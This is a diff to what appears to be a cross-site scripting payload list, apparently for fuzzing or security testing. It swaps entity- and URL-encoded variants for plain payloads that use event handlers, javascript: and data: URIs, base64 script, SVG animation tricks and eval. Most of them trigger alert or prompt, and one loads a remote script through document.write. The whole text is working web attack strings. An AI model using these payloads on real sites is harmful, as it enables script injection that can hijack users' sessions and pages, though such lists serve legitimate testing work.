@@ -1,24 +1,23 @@
 "'><
 </xss>
-<svg><script/==>al%26%23x65rt(1)</script ?
-<img/src/onerror=al%26%23x65rt(1)>
-<object/data="da%26%23x74;a:text/html,<svg/onload=al%26%23x65rt(1)>">
-<object/data="dat%26%23x61:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<object/data='jav%26%23x61%3Bscript:document.write("<scrip%26%23x74%3B src=//1.1><\/scrip%26%23x74%3B>");'></object>
-<object id=x data="jav%26%23x61%3Bscript:$('%26%23x23%3Bx').html('<scrip%26%23x74%3B>%26%23x61%3Blert(1);<\/scrip%26%23x74%3B>');">
-<form><button/formaction=jav%26%23x61%3Bscript:%26%23x61%3Blert(1)>sublimt
-<input/value=x%0Concut=aler%26%23x74(1)>
-<input/type=image%0Csrc=0%0Conerror=aler%26%23x74(1)>
-<input/onblur=aler%26%23x74(1)%0Cautofocus>
-<iframe%0C%00%0Csrc="javascrip%26%23x74:promp%26%23x74(1)"%00>
+<svg><script/==>alert(1)</script ?
+<img/src/onerror=alert(1)>
+<object/data="data:text/html,<svg/onload=alert(1)>">
+<object/data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object/data='javascript:document.write("<script src=//1.1><\/script>");'></object>
+<object id=x data="javascript:$('#x').html('<script>alert(1);<\/script>');">
+<form><button/formaction=javascript:alert(1)>sublimt
+<input/value=x oncut=alert(1)>
+<input/type=image src=0 onerror=alert(1)>
+<input/onblur=alert(1) autofocus>
+<iframe src="javascript:prompt(1)">
 <iframe/srcdoc="&lt;svg/onload=alert(1)&gt;"></iframe>
-<img/src=="x%20onerror=aler%26%23x(1)//">
-<audio/src="x"onloadstart=al%26%23x65%3Brt(1)></audio>
-<video><source onerror=al%26%23x65%3Brt(1)>
-<svg><script/xlink:href=data::,aler%26%23x74%3B(1)></script
-<object/data=data::,aler%26%23x74%3B(1)>
-<body/onscroll=%26%23x61%3Blert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<img/src=="x onerror=alert(1)//">
+<audio/src="x" onloadstart=alert(1)></audio>
+<video><source onerror=alert(1)>
+<svg><script/xlink:href=data::,alert(1)></script
+<body/onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
 <style><img src="</style><img src=x onerror=alert(1)//">
 <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" /></a>
-<object/data=jav%26%23x61%3Bscript:%26%23x61%3Blert(1)>
+<object/data=javascript:alert(1)>
 <img/src=x:prompt(0) onerror=eval(src)>
